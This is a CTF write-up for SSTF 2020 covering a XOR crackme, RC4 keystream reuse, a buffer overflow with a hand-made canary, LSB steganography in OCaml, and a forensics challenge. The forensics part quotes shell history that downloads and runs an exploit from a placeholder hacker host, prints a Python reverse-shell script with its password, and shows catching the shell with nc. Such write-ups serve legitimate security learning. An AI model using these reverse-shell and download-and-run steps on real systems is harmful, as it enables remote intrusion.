# SSTF 2020 writeup
## REV
### CrackMe 101 | 50pt | [crackme101](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/rev/crackme101)
file crackme101
: crackme101: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bcf9f936057bca3c0f9c02ddf0bde35de66efae7, for GNU/Linux 3.2.0, not stripped
ELF 64-bit file, let's open with Ghidra
```c++
undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  int local_88;
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter the password! : ");
  __isoc99_scanf(&DAT_0010206e,local_78);
  sVar2 = strlen(local_78);
  iVar1 = (int)sVar2;
  getMaskedStr(local_78,sVar2);
  local_88 = 0;
  while ((local_88 < iVar1 &&
         ("Dtd>=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&"[local_88] == local_78[(iVar1 - local_88) + -1])))
  {
    local_88 = local_88 + 1;
  }
  if (local_88 != iVar1) {
    puts("Login Failed!");
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
      __stack_chk_fail();
    }
    return 0;
  }
  puts("Successfully logged in!\nGood job!"); 
  exit(0);
}
```
It compare "Dtd>=mhpNCqz?~~" with input **in reverse order** after **getMaskedStr()** function.
```c++
void getMaskedStr(char *param_1,long param_2)

{
  size_t sVar1;
  int local_18;
  
  sVar1 = strlen(param_1);
  local_18 = 0;
  while (local_18 < (int)sVar1) {
    *(byte *)(param_2 + local_18) =
         param_1[local_18] ^ "u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&A]2[rPM9"[local_18];
    local_18 = local_18 + 1;
  }
  *(undefined *)(param_2 + (int)sVar1) = 0;
  return;
}
```
It XORs param_1 ( input str ) with "u7fl(3 \~\~", well ,  then, I can get flag by reversing the order of "Dtd>=mhp\~\~" and XORing with "u7f1 ~~~"

here is script. [solve.py](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/rev/solve.py)
 
## CRYPTO
### RC four | 50pt | [challenge.py](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/crypto/challenge.py), [output.txt](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/crypto/output.txt)
```python
from Crypto.Cipher import ARC4

from secret import key, flag

from binascii import hexlify

#RC4 encrypt function with "key" variable.

def encrypt(data):

#check the key is long enough

assert(len(key) > 128)

#make RC4 instance

cipher = ARC4.new(key)

#We don't use the first 1024 bytes from the key stream.

#Actually this is not important for this challenge. Just ignore.

cipher.encrypt("0"*1024)

#encrypt given data, and return it.

return cipher.encrypt(data)

msg = "RC4 is a Stream Cipher, which is very simple and fast."

print (hexlify(encrypt(msg)).decode())

print (hexlify(encrypt(flag)).decode())
```
RC4 is just XOR plain text and a keystream. Msg (plain text) and encrypted string are given. So we can get the keystream by XORing msg with encrypted msg.
>// msg
>634c3323bd82581d9e5bbfaaeb17212eebfc975b29e3f4452eefc08c09063308a35257f1831d9eb80a583b8e28c6e4d2028df5d53df8 
>// flag
624c5345afb3494cdd6394bbbf06043ddacad35d28ceed112bb4c8823e45332beb4160dca862d8a80a45649f7a96e9cb 

Then, you can get flag by XORing encrypted flag with the keystream. [decrypt.py](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/crypto/decrypt.py)
## PWN
### BOF101 | 50pt | [bof101](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/pwn/bof101),[bof101.c](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/pwn/bof101.c)
```c++
#include <stdio.h>

//#include <fcntl.h>

//#include <unistd.h>

#include <stdlib.h>

#include <string.h>

void printflag(){

char buf[32];

FILE* fp = fopen("/flag", "r");

fread(buf, 1, 32, fp);

fclose(fp);

printf("%s", buf);

fflush(stdout);

}

int main() {

int check=0xdeadbeef;

char name[140];

printf("printflag()'s addr: %p\n", &printflag);

printf("What is your name?\n: ");

fflush(stdout);

scanf("%s", name);

if (check != 0xdeadbeef){

printf("[Warning!] BOF detected!\n");

fflush(stdout);

exit(0);

}

return 0;

}
```
**gdb-peda$ checksec**
CANARY    : disabled
FORTIFY   : disabled
**NX        : ENABLED**
**PIE       : ENABLED**
**RELRO     : FULL**

We can input over ret address at **name**. There is **hand-made CANARY** whose value is** 0xdeadbeef**. **PIE** is enabled but don't worry. The address of **printflag()** function (oneshot) is given.

Input until **check** , input 0xdeadbeef , input dummy until ret address and input the address of **printflag()**

here is exploit code. [ex.py](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/pwn/ex.py)
## CODING	
### My Stego | 50pt | [challenge.ml](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/stegano/challenge.ml),[challenge.bmp](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/stegano/challenge.bmp)
Let's see ml file
```OCaml
open Images;;
open OImages;;
type file_pointer = Null_FP | FP of in_channel;;
class data_feeder =
object(self)
val mutable fp = Null_FP
val mutable cur = 0
val mutable idx = 0

method fopen fn =
fp <- FP (open_in fn)

method fread =

if idx = 0
then
match fp with
| Null_FP -> idx <- 7; cur <- 0
| FP f ->
idx <- 7;

try
cur <- int_of_char (input_char f)
with End_of_file ->
close_in f; fp <- Null_FP; cur <- 0

else
idx <- idx - 1;
let bit = (cur lsr idx) land 1 in
bit

end;;

if Array.length Sys.argv < 4 then
(Printf.printf "Usage: %s [input file] [output file] [file to embed]\n" Sys.argv.(0); exit 0);;

let df = new data_feeder;;
df#fopen(Sys.argv.(3));;
let file = Sys.argv.(1) in
let imgdata = OImages.load file [] in
let format, _ = Images.file_format file in
let img =
match OImages.tag imgdata with
| Rgb24 img -> print_endline "Rgb24"; img
| Index8 img -> print_endline "Index8"; img#to_rgb24
| _ -> print_endline "Not supported input file"; assert false
in
Printf.printf "image width: %d\n" img#width;
Printf.printf "image height: %d\n" img#height;
for y = 0 to img#height - 1 do
for x = 0 to img#width - 1 do
let color = img#get x y in
let r = color.r - (color.r land 1) + ((color.g lxor color.b lxor df#fread) land 1) in
img#set x y {r=r;g=color.g;b=color.b}
done;
done;
img#save Sys.argv.(2) (Some format) [Save_Quality 100];
print_endline "Save done"
```
I didn't know about OCaml language. But I can unterstand how it works.
```OCaml
let r = color.r - (color.r land 1) + ((color.g lxor color.b lxor df#fread) land 1) i
```
get rgb value, and set first bit of **r** into 0, and then XOR **g** and **b** and **1 bit of the flag file**(df#fread)
```OCaml
else
idx <- idx - 1;
let bit = (cur lsr idx) land 1 in
bit
```
In df#fread. Idx will be size of the flag file. It return 1 bit of the flag file. 
>like 11010... -> return 1, return 1, return 0,return 1, return 0 ...

SO, I can get the bits of the flag file by get all rgb values of **challange.bmp** and XOR **r** and **g** and **b**
```python
from PIL import Image

img=Image.open("challenge.bmp"
rgb=img.load()
height=img.height
width=img.width
bits=''
img.getpixel((2,1))
for i in range(height):
	for j in range(width):
		r,g,b=img.getpixel((j,i))
		bits+=str((r^g^b)&1)
```
And then, convert bits to hex and make a file.
```python
f=open("out",'wb')
f.write(bytes.fromhex(hex(int(bits,2))[2:]))
f.close()
```
file : 42 4D 4E 26 ....., oh, that's the file format of BMP. So, I can get flag by saving the data as out.bmp

full and final code : [stegano.py](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/stegano/stegano.py)

## FORENSIC
### Hidden Clues | 50pt | [/home](https://github.com/snwox/Writeup/tree/master/CTF/2020/SSTF/forensic/home)
Hacker's home directory is given.
#### /.bash_history
```sh
whoami

id

pwd

wget http://hackerserver.doesnt.exist/exploit_x64

chmod +x exploit_x64

wget http://hackerserver.doesnt.exist/payload

decrypt payload > prs.py

./exploit_x64 --server hiddenclues.sstf.site --port 13579 --upload "prs.py"

./exploit_x64 --server hiddenclues.sstf.site --port 13579 --run "python prs.py" --remote_port 24680

rm -rf exploit_x64 prs.py

exit
```
Hmm.. he  downloaded **exploit_x64** and **payload**, decrypted payload to **prs\.py** using **decrypt** command, uploaded **prs\.py** on **hiddenclues.sstf.site:13579** , ran **prs\.py** on that server and removed.

I checked **hiddenclues.sstf.site**: **13579** and **24680**. Port ~~**13579 died**~~ but port **24680** is still alive
#### nc hiddenclues.sstf.site 24680
```
password :
```
I don't know password. But 
```
decrypt payload > prs.py
```
In this part, I thought decrypt command may be alias 
#### /.bashrc
```
~~~
# some more ls aliases

alias ll='ls -alF'

alias la='ls -A'

alias l='ls -CF'

alias decrypt='base64 -i -d'

~~~
```
It's right. so I can get prs.py by decrypting **payload** with base64.
```
$base64 -i -d payload > payload_decrypted
```
```python
#!/usr/bin/python

import socket, subprocess, os, sys
print "password:",
if raw_input().strip() != "hack'n'roll":
	exit()
MY_IP=raw_input("remote Server: ").strip()
MY_PORT=int(raw_input("remote Port: ").strip())
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((MY_IP, MY_PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p=subprocess.call(["/bin/sh", "-i"])

```
Oh, It's the program running on **hiddenclues.sstf.site 24680**. Now I know the password and I can execute reverse-shell on the server.
>And, if needed, you can use a  _restricted_  public shell server on  
**nc shellserver.sstf.site 1337**

In the description on this prob, I can use a shell on that server. But the command is restricted. So, let's execute a reverse-shell on this server.
#### nc shellserver.sstf.site 1337
```
$nc -lvp 1010
Listening on [0,0,0,0] (family 0, port 1010)
```
**nc** command is allowed. Make new terminal and connect to **hiddenclues.sstf.site 24680**
#### nc hiddenclues.sstf.site 24680 (New terminal)
```
$ nc hiddenclues.sstf.site 24680
password: hack'n'roll
remote Server: shellserver.sstf.site
remote Port: 1010
```
#### nc shellserver.sstf.site 1337
```
$nc -lvp 1010
Listening on [0,0,0,0] (family 0, port 1010)
Connection from ~~~~~ received !
/bin/sh: 0: can't access tty; job control turned off
$
```
Now I can use a reverse shell. Let's cat flag
![shell.png](https://github.com/snwox/Writeup/blob/master/CTF/2020/SSTF/source/shell.png)

# Thanks for reading :)
